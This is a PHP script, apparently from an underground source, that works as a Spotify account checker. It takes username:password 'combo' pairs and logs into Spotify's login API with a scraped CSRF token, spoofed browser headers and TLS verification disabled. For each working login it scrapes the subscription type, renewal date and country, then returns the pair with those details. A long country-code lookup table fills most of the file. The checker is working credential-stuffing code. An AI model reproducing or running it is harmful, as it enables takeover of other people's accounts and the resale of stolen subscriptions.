<?php
/*
* Created By @Voldemort1912
* Last Update: 28/03/2019
* Time: 1330
* Telegram @hewhomustnotbenamed
*/
// spotify class - DO NOT TOUCH!!!!!
class countryname{
	public function getname($inpcode){
switch($inpcode){
case 'AF': $countryname = 'Afghanistan';break;
case 'AL': $countryname = 'Albania';break;
case 'DZ': $countryname = 'Algeria';break;
case 'AX': $countryname = 'Aland Islands';break;
case 'AS': $countryname = 'American Samoa';break;
case 'AI': $countryname = 'Anguilla';break;
case 'AD': $countryname = 'Andorra';break;
case 'AO': $countryname = 'Angola';break;
case 'AN': $countryname = 'Antilles - Netherlands';break;
case 'AG': $countryname = 'Antigua and Barbuda';break;
case 'AQ': $countryname = 'Antarctica';break;
case 'AR': $countryname = 'Argentina';break;
case 'AM': $countryname = 'Armenia';break;
case 'AU': $countryname = 'Australia';break;
case 'AT': $countryname = 'Austria';break;
case 'AW': $countryname = 'Aruba';break;
case 'AZ': $countryname = 'Azerbaijan';break;
case 'BA': $countryname = 'Bosnia and Herzegovina';break;
case 'BB': $countryname = 'Barbados';break;
case 'BD': $countryname = 'Bangladesh';break;
case 'BE': $countryname = 'Belgium';break;
case 'BF': $countryname = 'Burkina Faso';break;
case 'BG': $countryname = 'Bulgaria';break;
case 'BH': $countryname = 'Bahrain';break;
case 'BI': $countryname = 'Burundi';break;
case 'BJ': $countryname = 'Benin';break;
case 'BM': $countryname = 'Bermuda';break;
case 'BN': $countryname = 'Brunei Darussalam';break;
case 'BO': $countryname = 'Bolivia';break;
case 'BR': $countryname = 'Brazil';break;
case 'BS': $countryname = 'Bahamas';break;
case 'BT': $countryname = 'Bhutan';break;
case 'BV': $countryname = 'Bouvet Island';break;
case 'BW': $countryname = 'Botswana';break;
case 'BV': $countryname = 'Belarus';break;
case 'BZ': $countryname = 'Belize';break;
case 'KH': $countryname = 'Cambodia';break;
case 'CM': $countryname = 'Cameroon';break;
case 'CA': $countryname = 'Canada';break;
case 'CV': $countryname = 'Cape Verde';break;
case 'CF': $countryname = 'Central African Republic';break;
case 'TD': $countryname = 'Chad';break;
case 'CL': $countryname = 'Chile';break;
case 'CN': $countryname = 'China';break;
case 'CX': $countryname = 'Christmas Island';break;
case 'CC': $countryname = 'Cocos (Keeling) Islands';break;
case 'CO': $countryname = 'Colombia';break;
case 'CG': $countryname = 'Congo';break;
case 'CI': $countryname = "Cote D'Ivoire (Ivory Coast)";break;
case 'CK': $countryname = 'Cook Islands';break;
case 'CR': $countryname = 'Costa Rica';break;
case 'HR': $countryname = 'Croatia (Hrvatska)';break;
case 'CU': $countryname = 'Cuba';break;
case 'CY': $countryname = 'Cyprus';break;
case 'CZ': $countryname = 'Czech Republic';break;
case 'CD': $countryname = 'Democratic Republic of the Congo';break;
case 'DJ': $countryname = 'Djibouti';break;
case 'DK': $countryname = 'Denmark';break;
case 'DM': $countryname = 'Dominica';break;
case 'DO': $countryname = 'Dominican Republic';break;
case 'EC': $countryname = 'Ecuador';break;
case 'EG': $countryname = 'Egypt';break;
case 'SV': $countryname = 'El Salvador';break;
case 'TP': $countryname = 'East Timor';break;
case 'EE': $countryname = 'Estonia';break;
case 'GQ': $countryname = 'Equatorial Guinea';break;
case 'ER': $countryname = 'Eritrea';break;
case 'ET': $countryname = 'Ethiopia';break;
case 'FI': $countryname = 'Finland';break;
case 'FJ': $countryname = 'Fiji';break;
case 'FK': $countryname = 'Falkland Islands (Malvinas)';break;
case 'FM': $countryname = 'Federated States of Micronesia';break;
case 'FO': $countryname = 'Faroe Islands';break;
case 'FR': $countryname = 'France';break;
case 'FX': $countryname = 'France, Metropolitan';break;
case 'GF': $countryname = 'French Guiana';break;
case 'PF': $countryname = 'French Polynesia';break;
case 'GA': $countryname = 'Gabon';break;
case 'GM': $countryname = 'Gambia';break;
case 'DE': $countryname = 'Germany';break;
case 'GH': $countryname = 'Ghana';break;
case 'GI': $countryname = 'Gibraltar';break;
case 'GB': $countryname = 'Great Britain (UK)';break;
case 'GD': $countryname = 'Grenada';break;
case 'GE': $countryname = 'Georgia';break;
case 'GR': $countryname = 'Greece';break;
case 'GL': $countryname = 'Greenland';break;
case 'GN': $countryname = 'Guinea';break;
case 'GP': $countryname = 'Guadeloupe';break;
case 'GS': $countryname = 'S. Georgia and S. Sandwich Islands';break;
case 'GT': $countryname = 'Guatemala';break;
case 'GU': $countryname = 'Guam';break;
case 'GW': $countryname = 'Guinea-Bissau';break;
case 'GY': $countryname = 'Guyana';break;
case 'HK': $countryname = 'Hong Kong';break;
case 'HM': $countryname = 'Heard Island and McDonald Islands';break;
case 'HN': $countryname = 'Honduras';break;
case 'HT': $countryname = 'Haiti';break;
case 'HU': $countryname = 'Hungary';break;
case 'ID': $countryname = 'Indonesia';break;
case 'IE': $countryname = 'Ireland';break;
case 'IL': $countryname = 'Israel';break;
case 'IN': $countryname = 'India';break;
case 'IO': $countryname = 'British Indian Ocean Territory';break;
case 'IQ': $countryname = 'Iraq';break;
case 'IR': $countryname = 'Iran';break;
case 'IT': $countryname = 'Italy';break;
case 'JM': $countryname = 'Jamaica';break;
case 'JO': $countryname = 'Jordan';break;
case 'JP': $countryname = 'Japan';break;
case 'KE': $countryname = 'Kenya';break;
case 'KG': $countryname = 'Kyrgyzstan';break;
case 'KI': $countryname = 'Kiribati';break;
case 'KM': $countryname = 'Comoros';break;
case 'KN': $countryname = 'Saint Kitts and Nevis';break;
case 'KP': $countryname = 'Korea (North)';break;
case 'KR': $countryname = 'Korea (South)';break;
case 'KW': $countryname = 'Kuwait';break;
case 'KY': $countryname = 'Cayman Islands';break;
case 'KZ': $countryname = 'Kazakhstan';break;
case 'LA': $countryname = 'Laos';break;
case 'LB': $countryname = 'Lebanon';break;
case 'LC': $countryname = 'Saint Lucia';break;
case 'LI': $countryname = 'Liechtenstein';break;
case 'LK': $countryname = 'Sri Lanka';break;
case 'LR': $countryname = 'Liberia';break;
case 'LS': $countryname = 'Lesotho';break;
case 'LT': $countryname = 'Lithuania';break;
case 'LU': $countryname = 'Luxembourg';break;
case 'LV': $countryname = 'Latvia';break;
case 'LY': $countryname = 'Libya';break;
case 'MK': $countryname = 'Macedonia';break;
case 'MO': $countryname = 'Macao';break;
case 'MG': $countryname = 'Madagascar';break;
case 'MY': $countryname = 'Malaysia';break;
case 'ML': $countryname = 'Mali';break;
case 'MW': $countryname = 'Malawi';break;
case 'MR': $countryname = 'Mauritania';break;
case 'MH': $countryname = 'Marshall Islands';break;
case 'MQ': $countryname = 'Martinique';break;
case 'MU': $countryname = 'Mauritius';break;
case 'YT': $countryname = 'Mayotte';break;
case 'MT': $countryname = 'Malta';break;
case 'MX': $countryname = 'Mexico';break;
case 'MA': $countryname = 'Morocco';break;
case 'MC': $countryname = 'Monaco';break;
case 'MD': $countryname = 'Moldova';break;
case 'MN': $countryname = 'Mongolia';break;
case 'MM': $countryname = 'Myanmar';break;
case 'MP': $countryname = 'Northern Mariana Islands';break;
case 'MS': $countryname = 'Montserrat';break;
case 'MV': $countryname = 'Maldives';break;
case 'MZ': $countryname = 'Mozambique';break;
case 'NA': $countryname = 'Namibia';break;
case 'NC': $countryname = 'New Caledonia';break;
case 'NE': $countryname = 'Niger';break;
case 'NF': $countryname = 'Norfolk Island';break;
case 'NG': $countryname = 'Nigeria';break;
case 'NI': $countryname = 'Nicaragua';break;
case 'NL': $countryname = 'Netherlands';break;
case 'NO': $countryname = 'Norway';break;
case 'NP': $countryname = 'Nepal';break;
case 'NR': $countryname = 'Nauru';break;
case 'NU': $countryname = 'Niue';break;
case 'NZ': $countryname = 'New Zealand (Aotearoa)';break;
case 'OM': $countryname = 'Oman';break;
case 'PA': $countryname = 'Panama';break;
case 'PE': $countryname = 'Peru';break;
case 'PG': $countryname = 'Papua New Guinea';break;
case 'PH': $countryname = 'Philippines';break;
case 'PK': $countryname = 'Pakistan';break;
case 'PL': $countryname = 'Poland';break;
case 'PM': $countryname = 'Saint Pierre and Miquelon';break;
case 'CS': $countryname = 'Serbia and Montenegro';break;
case 'PN': $countryname = 'Pitcairn';break;
case 'PR': $countryname = 'Puerto Rico';break;
case 'PS': $countryname = 'Palestinian Territory';break;
case 'PT': $countryname = 'Portugal';break;
case 'PW': $countryname = 'Palau';break;
case 'PY': $countryname = 'Paraguay';break;
case 'QA': $countryname = 'Qatar';break;
case 'RE': $countryname = 'Reunion';break;
case 'RO': $countryname = 'Romania';break;
case 'RU': $countryname = 'Russian Federation';break;
case 'RW': $countryname = 'Rwanda';break;
case 'SA': $countryname = 'Saudi Arabia';break;
case 'WS': $countryname = 'Samoa';break;
case 'SH': $countryname = 'Saint Helena';break;
case 'VC': $countryname = 'Saint Vincent and the Grenadines';break;
case 'SM': $countryname = 'San Marino';break;
case 'ST': $countryname = 'Sao Tome and Principe';break;
case 'SN': $countryname = 'Senegal';break;
case 'SC': $countryname = 'Seychelles';break;
case 'SL': $countryname = 'Sierra Leone';break;
case 'SG': $countryname = 'Singapore';break;
case 'SK': $countryname = 'Slovakia';break;
case 'SI': $countryname = 'Slovenia';break;
case 'SB': $countryname = 'Solomon Islands';break;
case 'SO': $countryname = 'Somalia';break;
case 'ZA': $countryname = 'South Africa';break;
case 'ES': $countryname = 'Spain';break;
case 'SD': $countryname = 'Sudan';break;
case 'SR': $countryname = 'Suriname';break;
case 'SJ': $countryname = 'Svalbard and Jan Mayen';break;
case 'SE': $countryname = 'Sweden';break;
case 'CH': $countryname = 'Switzerland';break;
case 'SY': $countryname = 'Syria';break;
case 'SU': $countryname = 'USSR (former)';break;
case 'SZ': $countryname = 'Swaziland';break;
case 'TW': $countryname = 'Taiwan';break;
case 'TZ': $countryname = 'Tanzania';break;
case 'TJ': $countryname = 'Tajikistan';break;
case 'TH': $countryname = 'Thailand';break;
case 'TL': $countryname = 'Timor-Leste';break;
case 'TG': $countryname = 'Togo';break;
case 'TK': $countryname = 'Tokelau';break;
case 'TO': $countryname = 'Tonga';break;
case 'TT': $countryname = 'Trinidad and Tobago';break;
case 'TN': $countryname = 'Tunisia';break;
case 'TR': $countryname = 'Turkey';break;
case 'TM': $countryname = 'Turkmenistan';break;
case 'TC': $countryname = 'Turks and Caicos Islands';break;
case 'TV': $countryname = 'Tuvalu';break;
case 'UA': $countryname = 'Ukraine';break;
case 'UG': $countryname = 'Uganda';break;
case 'AE': $countryname = 'United Arab Emirates';break;
case 'UK': $countryname = 'United Kingdom';break;
case 'US': $countryname = 'United States';break;
case 'UM': $countryname = 'United States Minor Outlying Islands';break;
case 'UY': $countryname = 'Uruguay';break;
case 'UZ': $countryname = 'Uzbekistan';break;
case 'VU': $countryname = 'Vanuatu';break;
case 'VA': $countryname = 'Vatican City State';break;
case 'VE': $countryname = 'Venezuela';break;
case 'VG': $countryname = 'Virgin Islands (British)';break;
case 'VI': $countryname = 'Virgin Islands (U.S.)';break;
case 'VN': $countryname = 'Viet Nam';break;
case 'WF': $countryname = 'Wallis and Futuna';break;
case 'EH': $countryname = 'Western Sahara';break;
case 'YE': $countryname = 'Yemen';break;
case 'YU': $countryname = 'Yugoslavia (former)';break;
case 'ZM': $countryname = 'Zambia';break;
case 'ZR': $countryname = 'Zaire (former)';break;
case 'ZW': $countryname = 'Zimbabwe';break;
default: $countryname = 'Unknown Country -> $inpcode';break;
}
return $countryname;
}
}
class spotify{
    public function check($username, $password){
        $ch = curl_init('https://accounts.spotify.com/');
        $headers = array();
        $headers[] = "Accept-Encoding: gzip, deflate, sdch, br";
        $headers[] = "Accept-Language: it-IT,it;q=0.8,en-US;q=0.6,en;q=0.4";
        $headers[] = "Upgrade-Insecure-Requests: 1";
        $headers[] = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36";
        $headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
        $headers[] = "Cache-Control: max-age=0";
        $headers[] = "Connection: keep-alive";
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch,CURLOPT_USERAGENT,'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.13) Gecko/20080311 Firefox/2.0.0.13');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_HEADER, 1);
        $result = curl_exec($ch);
        preg_match('/^Set-Cookie:\s*([^;]*)/mi', $result, $m);
        parse_str($m[1], $cookies);
        $token = $cookies['csrf_token'];
        $bon_cookie = base64_encode("0|0|0|0|1|1|1|1");
        $ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, "https://accounts.spotify.com/api/login");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "remember=false&username=$username&password=$password&csrf_token=$token");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_HEADER, 1);
        curl_setopt($ch, CURLOPT_VERBOSE, 0);
        $headers = array();
        $headers[] = "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) FxiOS/1.0 Mobile/12F69 Safari/600.1.4";
        $headers[] = "Content-Type: application/x-www-form-urlencoded";
		$headers[] = "Accept: application/json, text/plain";
		$headers[] = "Cookie: sp_t=; sp_new=1; __bon=$bon_cookie; _gat=1; __tdev=VV4fjDj7; __tvis=BGWgw2Xk; spot=; csrf_token=$token; remember=$username";
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
       $result = curl_exec($ch);
        $header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
        $header = substr($result, 0, $header_size);
        $body = substr($result, $header_size);
        preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $result, $matches);
        $cookies = array();
        foreach($matches[1] as $item) {
            parse_str($item, $cookie);
            $cookies = array_merge($cookies, $cookie);
        }
        $output['body'] = $body;
        $output['cookies'] = $cookies;
        $auth = $output;
        $json_response = $auth['body'];
        $array_response = json_decode($json_response, true);
        error_reporting(0);
        $error = $array_response['error'];
        $display_name = $array_response['displayName'];
        if ($error != null){
            $output_check['status'] = false;
            $output_check['error'] = $error;
            $cruderesultfail = array();
            $cruderesultfail['status'] = $output_check['status'];
            $cruderesultfail['error'] = $error;
            
            $finaljsonfail = json_encode($cruderesultfail);
            return $finaljsonfail;
            
        } else if ($display_name != null){
            $output_check['status'] = true;
            $output_check['error'] = "null";
            $cookies = $auth['cookies'];
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, "https://www.spotify.com/us/account/overview/");
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
            curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
            $cookie = $cookies['sp_dc'];
            $headers = array();
            $headers[] = "Accept-Encoding: gzip, deflate, sdch, br";
            $headers[] = "Accept-Language: it-IT,it;q=0.8,en-US;q=0.6,en;q=0.4";
            $headers[] = "Upgrade-Insecure-Requests: 1";
            $headers[] = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36";
            $headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
            $headers[] = "Cookie: sp_ftv=1; sp_landing=www.spotify.com^%^2F; sp_landing_15d=www.spotify.com^%^2F; sp_landing_30d=www.spotify.com^%^2F; sp_new=1; sp_ab=; pxt=; justRegistered=null; _gat=1; sp_dc=$cookie";
            $headers[] = "Connection: keep-alive";
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	    $result = curl_exec($ch);
            if (strpos($result, "re currently Spotify Free.") == true) {
                $output_check['subscription'] = "FREE";
            } else{
		$output_check['subscription'] = "PREMIUM";
		
		$subscription0 = explode('<h3 class="product-name">', $result);
		$subscription = explode('</h3>', $subscription0[1]);
		$subscription=strip_tags($subscription[0]);
		
		$countryinf0 = explode('<p class="form-control-static" id="card-profile-country">',$result);
		$countryinf = explode('</p></div></form><a href="',$countryinf0[1]);
		
		$duedate0 = explode('<b class="recurring-date">',$result);
		$duedate = explode('</b>',$duedate0[1]);
		
		if ($duedate[0] == null){
			$duedate[0] = "-----";
		}
 
 /*
 Username : $username
 Password : $password
 Subscription Info : $subscription
 Renewal : $duedate[0]
 Country : $countryinf[0]
 */	
		$countryname = (new countryname())->getname($countryinf[0]);
		
		$cruderesult = array();
		$cruderesult['combo'] = $username.":".$password;
		$cruderesult['status'] = $output_check['status'];
		$cruderesult['subscription'] = $subscription;
		$cruderesult['expdate'] = $duedate[0];
		$cruderesult['ip'] = $countryname;
	    }
        }
        $output_json = json_encode($output_check);
        $finaljson = json_encode($cruderesult);
        return $finaljson;
    }
}
